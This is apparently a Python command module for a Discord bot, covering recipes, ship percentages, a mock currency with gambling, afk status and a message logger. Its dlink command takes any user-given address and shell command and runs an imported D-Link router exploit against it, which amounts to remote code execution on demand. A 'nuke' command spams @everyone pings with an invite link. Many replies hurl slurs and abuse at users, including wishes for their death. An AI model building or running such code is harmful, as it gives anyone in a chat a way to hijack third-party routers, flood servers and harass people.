import discord
import requests
import random
import time

from datetime import datetime, timedelta

from dlink_thingy import exploit, verify
from gamble import ensure_user_balance, load_balances, save_balances
from help_texts import info, text
from recipes import recipes
from shared_constants import SharedConstants
from ships import load_ships, save_ships

# i should probably comment some stuff or at the very least organize it
# but nah


# MARK: help
async def help_command(message: discord.Message) -> None:
    """displays all available commands."""
    args = message.content.split(" ")
    if len(args) != 2:
        await message.channel.send(text)
        return
    
    command = args[1].lower().strip()
    try:
        await message.channel.send(info[command])
    except KeyError:
        await message.channel.send(f"{command} is not an indexed command, you cunt. use `$help` to see all available commands.")




# MARK: sex
async def sex_command(message: discord.Message) -> None:
    """sexes people, unless you're guest and trying to sex a female, in which case you are physically unable to."""
    args = message.content.split(" ")
    
    if message.reference:
        reply = await message.channel.fetch_message(message.reference.message_id)
        await message.channel.send(f"sexed <@{reply.author.id}>")
        return
    
    if message.author.id == 1120699957415002212: # just for guest
        for girl in SharedConstants.females:
            if str(girl) in message.content:
                await message.channel.send("nuh uh.")
                return

    if len(args) < 2 or not args[1].strip():
        await message.channel.send(f"sexed no one (no bitches?)")
        return
    
    mentioned_user = message.mentions
    if mentioned_user:
        if message.author in mentioned_user:
            await message.channel.send("did you just try to sex yourself")
            return
        
        if mentioned_user.__len__() > 1:
            text = "sexed "
            for user in mentioned_user:
                text += f"<@{user.id}>"
                if mentioned_user[-1] != user:
                    text += " and "
            await message.channel.send(text)
        else:
            await message.channel.send(f"sexed <@{mentioned_user[0].id}>")
            return
    else:
        await message.channel.send(f"sexed {' '.join(args[1:])}")




# MARK: recipe
async def recipe_command(message: discord.Message) -> None:
    """sends recipes for \"stuff\""""
    args = message.content.split(" ")
    
    if len(args) < 2 or not args[1].strip():
        await message.channel.send("you fucking moron you want a recipe for something right you don't want to cook thin air you dumbfuck do you")
        return
    
    recipe_name = args[1].lower().strip()
    
    try:
        await message.channel.send(recipes[recipe_name])
    except KeyError:
        await message.channel.send("no such recipe is available yet (let me cook)")




# MARK: dlink
async def dlink_command(message: discord.Message) -> None:
    """uses the 9.8 critical score vulnerability discovered on some dlink routers on an ip address."""
    args = message.content.split(" ")
    
    if len(args) < 2 or not args[1].strip():
        await message.channel.send("pass a valid argument you nerd")
        return
    
    session = requests.Session()
    session.verify = False
    session.timeout = 5
    
    url = args[1].strip()
    command = ""
    for word in args[2:]:
        command += word + " "
    command = command.strip()
    
    try:
        request = requests.get(url)
    except Exception as e:
        await message.channel.send("uh oh")
        print(type(e).__name__)
        return
    
    if request.status_code != 200:
        await message.channel.send("invalid ip address. fucking moron.")
        return
    
    await message.channel.send("checking if target is vulnerable")
    if verify(url, session):
        await message.channel.send("yay target is vulnerable :D")
        await message.channel.send("performing the super mr robot secret popbob sex lava cactus dupe machine exploit...")
        await message.channel.send(exploit(url, session, command))
    else:
        await message.channel.send("aww target is not vulnerable D:")
        return
    
    


# MARK: ship
async def ship_command(message: discord.Message) -> None:
    """returns a random percentage of so called \"love\" between two people. percentages are persistent."""
    args = message.content.split(" ")
    
    if len(args) > 3 or len(args) == 1:
        await message.channel.send("jesus christ. you're such a fucking dumbass. you goddamn idiot, imbecile, stupid faggot. i really hope you die and rot in hell, you fucking autistic piece of fuck. you have no place in this universe. you're an useless prick. you're a waste of oxygen, space and resources. i fucking hope your dumb stupid fucking ass trips in a staircase and you painfully fall to your death. or even better, you don't die but end up with a full body paralysis, not even being able to ask for an euthanasia. the only reason i have to keep living is to watch you suffer. you deserve no space in humanity. you're nothing more than an arrogant, useless, idiotic fuckstick. please die. please. (you didn't correctly pass all arguments.)")
        return
    
    if len(args) == 2:
        try:
            user1 = message.author.id
            user2 = int(args[1].strip("<@!>"))
        except ValueError:
            await message.channel.send("die nerd")
            return
    else: 
        try:
            user1 = int(args[1].strip("<@!>"))
            user2 = int(args[2].strip("<@!>"))
        except ValueError:
            await message.channel.send("die nerd")
            return
    
    if user1 == user2:
        await message.channel.send("you're trying to ship yourself. no comment.")
        return

    pair_key = " ".join(sorted([str(user1), str(user2)]))
    ships = load_ships()

    if pair_key in ships:
        percentage = ships[pair_key]
    else:
        percentage = random.randint(0, 100)
        ships[pair_key] = percentage
        save_ships(ships)
        
    user1_mention = f"<@{user1}>"
    user2_mention = f"<@{user2}>"
    
    comment = str()
    if percentage < 10:
        comment = "why am i not suprised"
    elif percentage < 20:
        comment = "not a chance in hell"
    elif percentage < 50:
        comment = "i mean if you took a shower once in a while there might be some chance"
    elif percentage < 75:
        comment = "maybe i was wrong when i said you repelled all women in a 10m radius"
    else:
        comment = "yessir. i can forsee lots of anal sex."
    
    await message.channel.send(f"{user1_mention} ❤️ {user2_mention}: {percentage}% \n{comment}")




# MARK: logger
async def toggle_logger_command(message: discord.Message) -> None:
    """toggles the message logger that is triggered every time someone deletes their message."""
    if message.channel.permissions_for(message.author).administrator:
        SharedConstants.toggle_logging()
        await message.channel.send(f"message logging has been {"enabled" if SharedConstants.LOGGING_MESSAGES else "disabled"}.")
    else:
        await message.channel.send("who do you think you are to try and run this command? do you think you're important or something? you're not. fuck off you peasant.")




# MARK: balance
async def balance_command(message: discord.Message):
    """returns the balance of the user or a mentioned user."""
    if len(message.mentions) > 0:
        user_id = message.mentions[0].id
    else:
        user_id = message.author.id
    
    balances = ensure_user_balance(user_id)
    await message.channel.send(f"<@{user_id}> has **{balances[str(user_id)]}** retdollars (best currency fr fr)")




# MARK: cf
async def coinflip_command(message: discord.Message):
    """either doubles or loses your bet. martingale strategy goes brrrrr"""
    args = message.content.split(" ")
    if len(args) != 2 or not args[1].isdigit():
        await message.channel.send("you moron just use `$cf <amount>`. fuck you.")
        return
    
    bet = int(args[1])
    user_id = message.author.id

    balances = ensure_user_balance(user_id)

    if balances[str(user_id)] < bet:
        await message.channel.send(f"LMAO YOU'RE SO BROKE. YOUR POOR ASS HAS {balances[str(user_id)]} R$ GET A FUCKING JOB")
        return

    outcome = random.choice(["win", "lose"])
    if outcome == "win":
        balances[str(user_id)] += bet
        result = f"gambling is always the solution. your bet of {bet} R$ has been doubled. new balance: {balances[str(user_id)]} R$"
    else:
        balances[str(user_id)] -= bet
        result = f"take the L bozo. you lost it all, {bet} R$ less. new balance: {balances[str(user_id)]} R$. skill FUCKING issue."

    save_balances(balances)

    await message.channel.send(result)




# MARK: gift
async def gift_command(message: discord.Message):
    """transfers an amount of money from your balance to another person's one."""
    args = message.content.split(" ")
    if len(args) != 3 or not args[2].isdigit():
        await message.channel.send("i'm so tired of insulting you. please use the command correctly.")
        return
    
    giver_id = message.author.id
    recipient_mentions = message.mentions
    if len(recipient_mentions) != 1:
        await message.channel.send("mention just one user you nerd")
        return

    recipient_id = recipient_mentions[0].id
    amount = int(args[2])

    if amount <= 0:
        await message.channel.send(f"\"haha i'm so funny look i tried to gift someone {amount} R$ please help me i suffer from child abuse\"")
        return

    balances = ensure_user_balance(giver_id)
    ensure_user_balance(recipient_id)

    if balances[str(giver_id)] < amount:
        await message.channel.send(f"you broke motherfucker you only have {balances[str(giver_id)]} R$")
        return

    balances[str(giver_id)] -= amount
    balances[str(recipient_id)] += amount
    save_balances(balances)

    await message.channel.send(f"<@{giver_id}> has gifted {amount} R$ to <@{recipient_id}>")




# MARK: bless
async def bless_command(message: discord.Message):
    """summons money out of thin air and gifts it to a person. requires admin. supports negatives."""
    if (not message.channel.permissions_for(message.author).administrator and message.author.id != 806597513943056464) or message.author.id == 1007985339278827610:
        await message.channel.send("back off peasant.")
        return

    args = message.content.split(" ")
    if len(args) != 3:
        await message.channel.send("usage: `$bless <user> <amount>`. also you're a fucking idiot")
        return

    try:
        amount = int(args[2])
    except ValueError:
        await message.channel.send("usage: `$bless <user> <amount>`. also you're a fucking idiot")
        return

    recipient_mentions = message.mentions
    if len(recipient_mentions) != 1:
        await message.channel.send("when will you learn how to count")
        return
    recipient_id = recipient_mentions[0].id

    if amount == 0:
        await message.channel.send("so funny.")
        return

    balances = ensure_user_balance(recipient_id)
    balances[str(recipient_id)] += amount
    save_balances(balances)

    await message.channel.send(f"<@{recipient_id}> has been blessed by the almighty lord <@{message.author.id}> with {amount} R$")




# MARK: afk
async def afk_command(message: discord.Message) -> None:
    """sets you as afk, if you're afk when someone pings you they will be reminded you're afk."""
    try:
        content = message.content[len("$afk"):].strip() # i felt fancy alr
        if not content:
            afk_message = "masturbating"
            afk_until = None
        else:
            parts = content.split(" ", 1)
            if parts[0].isdigit():
                afk_minutes = int(parts[0])
                afk_message = parts[1] if len(parts) > 1 else "masturbating"
                afk_until = datetime.now() + timedelta(minutes=afk_minutes)
            else:
                afk_message = content
                afk_until = None

        SharedConstants.afk_users[message.author.id] = {"message": afk_message, "until": afk_until}

        time_msg = f" for {afk_minutes} min" if afk_until else ""
        await message.channel.send(f"{message.author.mention} is now ~~masturbating~~ afk{time_msg}: {afk_message}")
    except Exception as e:
        print(e)
        await message.channel.send("uh oh")
        
        
        

# MARK: nuke
async def nuke_command(message: discord.Message):
    """nuke command because guest hasn't learned about for loops yet."""
    args = message.content.split(" ")
    if len(args) > 1:
        try:
            times = int(args[1])
        except:
            message.channel.send("pass a valid number dumbass")
            return
    else:
        times = 10000
    
    for i in range(times):
        message.channel.send("GET NUKED MOFO BIG L OWNED BY GUEST AND RETTI | @everyone @everyone JOIN NOW https://discord.gg/R7G3ECwmVe")
        time.sleep(2)